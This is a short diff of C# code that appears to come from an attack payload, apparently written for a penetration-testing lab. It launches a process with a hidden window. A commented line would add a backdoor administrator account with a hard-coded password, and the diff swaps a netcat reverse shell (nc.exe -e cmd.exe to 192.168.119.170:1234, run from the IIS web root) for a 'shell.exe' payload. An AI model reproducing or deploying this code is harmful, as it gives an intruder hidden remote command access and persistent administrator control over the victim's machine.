@@ -38,8 +38,7 @@
             startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
             //startInfo.FileName = "cmd.exe";
             //startInfo.Arguments = "/C net user sasamba Sasamba1! /add && net localgroup administrators sasamba /add";
-            startInfo.FileName = "C:\\Inetpub\\wwwroot\\nc.exe";
-            startInfo.Arguments = "-nv 192.168.119.170 1234 -e C:\\WINDOWS\\System32\\cmd.exe";
+            startInfo.FileName = "shell.exe";
             process.StartInfo = startInfo;
             process.Start();
 
